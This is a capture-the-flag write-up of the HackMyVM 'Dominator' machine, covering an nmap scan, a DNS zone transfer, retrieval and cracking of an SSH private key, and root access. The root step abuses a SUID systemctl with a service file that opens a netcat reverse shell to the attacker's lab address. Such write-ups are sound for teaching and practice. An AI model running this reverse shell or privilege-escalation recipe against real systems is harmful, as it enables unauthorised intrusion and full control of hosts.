---
layout: default
title : muzec - Dominator Writeup
---


![image](https://user-images.githubusercontent.com/69868171/121172209-73f95f80-c825-11eb-9992-5f80ffb884c8.png)

We always start with an nmap scan.....

```Nmap -sC -p- -sV -oA nmap <Target-IP>```

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HackMyVm/dominator]
└─$ cat nmap.nmap                                                                                                                                                  1 ⨯
# Nmap 7.91 scan initiated Mon Jun  7 18:03:16 2021 as: nmap -sC -p- -sV -oA nmap 172.16.139.207
Nmap scan report for 172.16.139.207
Host is up (0.00019s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
53/tcp    open  domain  (unknown banner: not currently available)
| dns-nsid: 
|_  bind.version: not currently available
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|     bind
|_    currently available
80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
65222/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 f7:ea:48:1a:a3:46:0b:bd:ac:47:73:e8:78:25:af:42 (RSA)
|   256 2e:41:ca:86:1c:73:ca:de:ed:b8:74:af:d2:06:5c:68 (ECDSA)
|_  256 33:6e:a2:58:1c:5e:37:e1:98:8c:44:b1:1c:36:6d:75 (ED25519)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.91%I=7%D=6/7%Time=60BE97B0%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,52,"\0P\0\x06\x85\0\0\x01\0\x01\0\x01\0\0\x07version\x0
SF:4bind\0\0\x10\0\x03\xc0\x0c\0\x10\0\x03\0\0\0\0\0\x18\x17not\x20current
SF:ly\x20available\xc0\x0c\0\x02\0\x03\0\0\0\0\0\x02\xc0\x0c");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun  7 18:03:42 2021 -- 1 IP address (1 host up) scanned in 26.19 seconds
```

We have 3 open port scanning for full ports give us three open ports which is nice we have DNS,HTTP and SSH running an higher port now let start our enumeration with HTTP.

![image](https://user-images.githubusercontent.com/69868171/121172563-d7838d00-c825-11eb-976f-40b0c8c3b763.png)

We have `robots.txt` nice let confirm it.

![image](https://user-images.githubusercontent.com/69868171/121172654-ed914d80-c825-11eb-9297-f3a1830e3f8f.png)

Added to `/etc/hosts` now let dig in DNS.

```
dig axfr @172.16.139.207
dig axfr @172.16.139.207 dominator.hmv
```

![image](https://user-images.githubusercontent.com/69868171/121173089-655f7800-c826-11eb-9f9f-eef9034092fb.png)

Nice so i need `secret.dominator.hmv.` to my `/etc/hosts` also `/fhcrefrperg` look strange try it on cyber chef got nothing so i try solve crypto with force.

![image](https://user-images.githubusercontent.com/69868171/121173392-c424f180-c826-11eb-9d4d-bad9133af947.png)

`http://secret.dominator.hmv/supersecret/`  and we have a file probably a private key let check it.

![image](https://user-images.githubusercontent.com/69868171/121173839-41506680-c827-11eb-89b9-e055dae6995f.png)

So download it to my machine for cracking we already have a username which is `hans` time to hit John The Ripper.

![image](https://user-images.githubusercontent.com/69868171/121174002-7492f580-c827-11eb-8ef8-2932cd257a92.png)

Giving the private key permission before logging in SSH.

![image](https://user-images.githubusercontent.com/69868171/121174157-9f7d4980-c827-11eb-9686-61ba48f629b6.png)

Now getting the user.txt flag so we have a note on the user home directory.

![image](https://user-images.githubusercontent.com/69868171/121174261-ba4fbe00-c827-11eb-9870-63adf5fa574e.png)

Time to use find command to get it `find / -name user.txt 2>/dev/null` and boom found it in trash.

![image](https://user-images.githubusercontent.com/69868171/121174446-e8cd9900-c827-11eb-88d5-fc75104c1d1f.png)


### Privilege Escalation

Checking SUID `find / -perm -u=s -type f 2>/dev/null` and we have `/usr/bin/systemctl` running on SUID cool let check gtfobins.

![image](https://user-images.githubusercontent.com/69868171/121174733-3b0eba00-c828-11eb-96a7-85032b2fa7fd.png)

```
hans@Dominator:~$ TF=$(mktemp).service
hans@Dominator:~$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.20.10.4 1337 >/tmp/f"
> [Install]
> WantedBy=multi-user.target' > $TF
hans@Dominator:~$ /usr/bin/systemctl link $TF
Created symlink /etc/systemd/system/tmp.nBo4OcIuNS.service → /tmp/tmp.nBo4OcIuNS.service.
hans@Dominator:~$ /usr/bin/systemctl enable --now $TF
Created symlink /etc/systemd/system/multi-user.target.wants/tmp.nBo4OcIuNS.service → /tmp/tmp.nBo4OcIuNS.service.
```
Checking our Ncat listener and we have root shell.

![image](https://user-images.githubusercontent.com/69868171/121175574-339be080-c829-11eb-84f4-b5a4d221e2b0.png)

We are root and done.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
